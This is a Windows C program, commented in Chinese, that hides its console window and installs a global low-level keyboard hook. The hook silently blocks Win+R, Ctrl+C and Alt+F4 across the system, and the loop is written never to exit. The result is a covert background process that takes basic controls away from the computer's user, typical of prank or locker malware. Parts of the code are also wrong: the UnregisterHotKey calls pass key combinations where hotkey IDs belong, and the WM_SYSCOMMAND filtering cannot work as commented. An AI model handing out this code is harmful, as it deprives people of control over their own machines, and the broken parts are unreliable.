#include <windows.h>
#include <tchar.h>

// 全局钩子句柄
HHOOK g_hLowLevelKeyboard = NULL;

// 注销系统默认热键（Alt+F4/Win+R等）
VOID UnregisterSystemHotkeys() {
    // 注销Alt+F4相关系统热键
    UnregisterHotKey(NULL, MOD_ALT | VK_F4);
    // 注销Win+R相关系统热键
    UnregisterHotKey(NULL, MOD_WIN | 'R');
    // 注销Ctrl+C相关系统热键
    UnregisterHotKey(NULL, MOD_CONTROL | 'C');
}

// 低级别键盘钩子（核心拦截）
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pkbd = (KBDLLHOOKSTRUCT*)lParam;
        
        // ===== 拦截Win+R =====
        BOOL bWinDown = (GetKeyState(VK_LWIN) & 0x8000) || (GetKeyState(VK_RWIN) & 0x8000);
        if (bWinDown && pkbd->vkCode == 'R' && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
            return 1; // 直接拦截，不传递给系统
        }

        // ===== 拦截Ctrl+C =====
        BOOL bCtrlDown = (GetKeyState(VK_CONTROL) & 0x8000);
        if (bCtrlDown && pkbd->vkCode == 'C' && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
            return 1;
        }

        // ===== 拦截Alt+F4（双重拦截：按键+系统键） =====
        BOOL bAltDown = (GetKeyState(VK_MENU) & 0x8000);
        if (bAltDown && pkbd->vkCode == VK_F4) {
            // 拦截普通按键和系统按键（WM_KEYDOWN/WM_SYSKEYDOWN）
            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN || wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
                return 1;
            }
        }

        // ===== 拦截WM_SYSCOMMAND对应的按键触发 =====
        if (pkbd->vkCode == VK_F4 && (pkbd->flags & LLKHF_ALTDOWN)) {
            return 1;
        }
    }
    return CallNextHookEx(g_hLowLevelKeyboard, nCode, wParam, lParam);
}

// 隐藏控制台窗口（后台运行）
VOID HideConsole() {
    HWND hConsole = GetConsoleWindow();
    if (hConsole != NULL) {
        ShowWindow(hConsole, SW_HIDE);
        SetWindowPos(hConsole, HWND_BOTTOM, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);
    }
}

int _tmain(int argc, TCHAR* argv[]) {
    // 1. 隐藏控制台，后台运行
    HideConsole();

    // 2. 注销系统热键，阻断默认响应
    UnregisterSystemHotkeys();

    // 3. 安装全局低级别键盘钩子（最高优先级）
    g_hLowLevelKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    // 4. 消息循环（维持钩子活性，永不退出）
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        // 过滤WM_SYSCOMMAND消息（Alt+F4的最终触发消息）
        if (msg.message == WM_SYSCOMMAND && msg.wParam == SC_CLOSE) {
            continue; // 丢弃关闭窗口消息
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // 清理（实际永不执行，除非强制结束进程）
    UnhookWindowsHookEx(g_hLowLevelKeyboard);
    return 0;
}
